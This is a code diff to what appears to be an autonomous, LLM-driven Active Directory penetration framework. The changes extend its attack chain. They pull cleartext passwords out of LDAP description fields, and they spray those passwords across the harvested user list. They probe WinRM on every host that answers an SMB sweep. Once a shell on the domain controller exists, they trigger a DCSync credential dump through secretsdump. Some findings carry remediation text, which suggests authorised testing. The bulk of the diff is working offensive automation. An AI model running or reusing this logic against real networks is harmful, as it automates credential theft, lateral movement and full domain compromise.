@@ -804,7 +804,7 @@ def _merge_agent_intel(intel: dict) -> None:
         "winrm_access", "winrm_targets", "readable_shares", "creds_in_files", "acl_paths",
         "script_path_edges", "delegation", "ccaches", "flags", "valid_creds",
         "wsus_servers", "local_privesc_hints", "gmsa_candidates",
-        "gmsa_read_dead_for", "acl_scan_dead_for",
+        "gmsa_read_dead_for", "acl_scan_dead_for", "desc_passwords", "valid_creds_tested",
     ]
     dict_keys = ["nt_hashes", "gmsa_hashes"]
     bool_keys = ["pwn3d", "is_da", "ntlm_disabled", "adcs_shell_ready", "bloodhound_failed_nonblocking"]
@@ -833,7 +833,8 @@ def _agent_intel() -> dict:
         "creds_in_files": [], "acl_paths": [], "script_path_edges": [], "delegation": [],
         "ccaches": [], "flags": [], "valid_creds": [], "wsus_servers": [],
         "local_privesc_hints": [], "gmsa_candidates": [],
-        "gmsa_read_dead_for": [], "acl_scan_dead_for": [],
+        "gmsa_read_dead_for": [], "acl_scan_dead_for": [], "desc_passwords": [],
+        "valid_creds_tested": [],
         "nt_hashes": {}, "gmsa_hashes": {},
         "pwn3d": False, "is_da": False, "ntlm_disabled": False,
         "adcs_shell_ready": False, "bloodhound_failed_nonblocking": False,
@@ -1668,6 +1669,7 @@ def _analyze_result(tool_name: str, result: str) -> dict:
         "gmsa_candidates":    [],   # gMSA accounts discovered in LDAP/ACL output
         "computers":          [],   # AD computer accounts (sAMAccountName ending with $)
         "valid_creds":        [],   # validated creds discovered from loot
+        "desc_passwords":     [],   # cleartext passwords found in LDAP Description fields
         "wsus_servers":       [],   # WSUS hosts from ports/policy
         "local_privesc_hints": [],  # scheduled tasks, writable update dirs, ADCS/WSUS hints
         "pwn3d":              False,
@@ -1909,6 +1911,29 @@ def _analyze_result(tool_name: str, result: str) -> dict:
     if intel["users"]:
         if not Path("/tmp/users.txt").exists() or len(intel["users"]) > 3:
             Path("/tmp/users.txt").write_text("\n".join(set(intel["users"])))
+
+    # NXC LDAP --users: extract cleartext passwords from the Description column.
+    # Format per line: "LDAP  <ip>  <port>  <dc>  <username>  <date> <time>  <badpw>  <description>"
+    for m in re.finditer(
+            r'LDAP\s+\S+\s+\d+\s+\S+\s+(\S+)\s+\S+\s+\S+\s+\d+\s+(.+)',
+            result, re.I):
+        user_d, desc = m.group(1).strip(), m.group(2).strip()
+        if user_d.startswith('-') or not _valid_ad_target(user_d):
+            continue
+        pw_m = re.search(
+            r'(?:temp\s*)?(?:pwd?|pass(?:word)?)\s*[:=]?\s*(\S{4,128})',
+            desc, re.I)
+        if pw_m:
+            pw = pw_m.group(1).strip().rstrip('.,;')
+            if 4 <= len(pw) <= 128:
+                if pw not in intel["desc_passwords"]:
+                    intel["desc_passwords"].append(pw)
+                cred = {"user": user_d, "password": pw, "auth": "desc"}
+                if cred not in intel["valid_creds"]:
+                    intel["valid_creds"].append(cred)
+                pair = (user_d, pw)
+                if pair not in intel["creds_in_files"]:
+                    intel["creds_in_files"].append(pair)
 
     _merge_agent_intel(intel)
     return intel
@@ -6330,7 +6355,9 @@ def tool_evil_winrm(dc_ip: str, domain: str, username: str,
                     f"WinRM access: {username}@{host}",
                     "Restrict WinRM; audit Remote Management Users group")
         SESSION["owned_machines"].append(
-            {"machine": host, "user": username, "method": "WinRM (Kerberos)" if use_krb_auth else "WinRM",
+            {"machine": host, "user": username,
+             "nt_hash": nt_hash,
+             "method": "WinRM (Kerberos)" if use_krb_auth else "WinRM",
              "time": datetime.now().isoformat()})
         save_session()
 
@@ -6388,18 +6415,13 @@ def tool_kerbrute_enum(dc_ip: str, domain: str,
         "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
         "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
     ]
-    # Reject known password wordlists that will time-out (> 50 MB or known paths)
-    PASSWORD_WORDLISTS = {"rockyou", "rockyou.txt", "passwords", "darkweb2017", "10-million-password"}
-    wl_name = Path(wordlist).name.lower()
-    is_password_list = any(pw in wl_name for pw in PASSWORD_WORDLISTS)
-
-    if is_password_list or not Path(wordlist).exists():
-        # Fall through to priority list
-        wordlist = ""
-        for candidate in USERNAME_WORDLISTS:
-            if Path(candidate).exists():
-                wordlist = candidate
-                break
+    # Always use the priority list (smallest first) to avoid 120 s timeout.
+    # The default parameter is kept only for API compatibility — it is ignored.
+    wordlist = ""
+    for candidate in USERNAME_WORDLISTS:
+        if Path(candidate).exists():
+            wordlist = candidate
+            break
     if not wordlist:
         return ("Wordlist not found. Install: sudo apt install seclists\n"
                 "Or provide path to a usernames wordlist (not a password list)")
@@ -7826,13 +7848,18 @@ def tool_credential_dump(dc_ip: str, domain: str, username: str,
     results   = [f"=== Credential Dump: {username}@{host} ==="]
 
     secretsdump = _impacket_cmd("secretsdump")
+    # shell_quote the connection target — $ in gMSA names (msa_health$) expands
+    # as $@ or $<char> in bash and corrupts the host portion of the argument.
     if nt_hash:
-        sd_auth = f"{domain}/{username}@{host} -hashes :{nt_hash.split(':')[-1]}"
+        _sd_target = shell_quote(f"{domain}/{username}@{host}")
+        sd_auth = f"{_sd_target} -hashes :{nt_hash.split(':')[-1]}"
     elif krb and ccache:
         os.environ["KRB5CCNAME"] = ccache
-        sd_auth = f"-k -no-pass {domain}/{username}@{host}"
+        _sd_target = shell_quote(f"{domain}/{username}@{host}")
+        sd_auth = f"-k -no-pass {_sd_target}"
     elif password:
-        sd_auth = f"{domain}/{username}:{password}@{host}"
+        _sd_target = shell_quote(f"{domain}/{username}:{password}@{host}")
+        sd_auth = f"{_sd_target}"
     else:
         sd_auth = ""
 
@@ -8180,6 +8207,24 @@ def tool_user_hunt(dc_ip: str, domain: str, username: str,
         subnet_cidr = subnet if "/" in subnet else f"{subnet}/24"
         sweep_out = _nxc(f"smb {subnet_cidr} {auth} --no-bruteforce 2>&1 | grep '\\[+\\]'", timeout=60)
         results.append(f"=== NXC Sweep ===\n{sweep_out[:800]}")
+        # Try WinRM on non-DC hosts that responded with valid auth ([+])
+        for m in re.finditer(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+\S+\s+\[\+\]', sweep_out):
+            host_ip = m.group(1)
+            if host_ip == dc_ip:
+                continue
+            winrm_test = _nxc(f"winrm {host_ip} {auth}", timeout=15)
+            if "Pwn3d" in winrm_test:
+                wt = SESSION.setdefault("agent_intel", {}).setdefault("winrm_targets", [])
+                if host_ip not in wt:
+                    wt.append(host_ip)
+                add_finding(
+                    "WinRM Access Found", "High",
+                    f"WinRM shell access: {domain}\\{username} on {host_ip}",
+                    "Restrict WinRM access; implement Just Enough Administration (JEA)"
+                )
+                results.append(f"WinRM Pwn3d! on {host_ip}")
+            elif "[+]" in winrm_test or "[-]" not in winrm_test:
+                results.append(f"SMB valid on {host_ip} — WinRM not available")
     else:
         results.append(f"Found {len(computers)} domain computers")
 
@@ -9095,6 +9140,11 @@ def _pick_next_tool(completed_tools: list,
             return "credential_loot", {**owned_creds, "dc_ip": target}
         if not _done("jea_enum"):
             return "jea_enum", owned_creds
+        # DCSync when we have a shell on the DC — regardless of is_da flag.
+        # gMSA accounts with replication rights won't appear as DA in whoami /all
+        # but secretsdump -just-dc still works; this ensures we don't stop here.
+        if not _done("dcsync_attack") and (target == dc or not dc):
+            return "dcsync_attack", {**owned_creds}
 
     if owned and not _done("lateral_movement"):
         target = owned[0].get("machine", dc)
@@ -9437,8 +9487,28 @@ def _pick_next_tool(completed_tools: list,
     if not _done("kerbrute_enum"):
         return "kerbrute_enum", {"dc_ip": dc, "domain": dom}
 
-    # ── Priority 13: Password spray with discovered users ────────────────────
+    # ── Priority 12b: Test credentials found in LDAP Description fields ─────────
+    # Each desc_cred is a {user, password} pair for a specific account.
     _spray_userlist = "/tmp/users.txt"
+    desc_creds_pending = [
+        c for c in intel.get("valid_creds", [])
+        if c.get("auth") == "desc" and c.get("password") and c.get("user")
+        and c not in intel.get("valid_creds_tested", [])
+    ]
+    if desc_creds_pending and _calls("test_credential") < 3:
+        dc_c = desc_creds_pending[0]
+        SESSION.setdefault("agent_intel", {}).setdefault("valid_creds_tested", []).append(dc_c)
+        return "test_credential", {
+            "dc_ip": dc, "domain": dom,
+            "username": dc_c["user"], "password": dc_c["password"],
+        }
+
+    # Also spray description passwords against all users (may reuse same pw on others)
+    desc_pws = [pw for pw in intel.get("desc_passwords", []) if pw and pw != p]
+    if desc_pws and _calls("password_spray") < 2 and Path(_spray_userlist).exists():
+        return "password_spray", {**creds, "passwords": desc_pws, "userlist": _spray_userlist}
+
+    # ── Priority 13: Password spray with discovered users ────────────────────
     if (p or h) and not _done("password_spray") and Path(_spray_userlist).exists():
         return "password_spray", {**creds, "userlist": _spray_userlist}
 
@@ -10099,12 +10169,13 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
                     "username": SESSION.get("username",""),
                 }, tgt_result, tgt_commands)
                 completed_tools.append("request_tgt")
-                # Re-allow every NTLM-failed enumerator to retry with Kerberos
+                # Re-allow every NTLM-failed enumerator to retry with Kerberos.
+                # evil_winrm / lateral_movement are NOT reset here — they loop
+                # independently and should only retry when the credential changes.
                 for retryable in (
                     "enumerate_ldap", "enumerate_shares", "adcs_scan",
                     "asrep_roast", "kerberoast",
                     "collect_bloodhound", "auto_loot_chain", "acl_abuse_scan",
-                    "evil_winrm", "lateral_movement",
                 ):
                     while retryable in completed_tools:
                         completed_tools.remove(retryable)
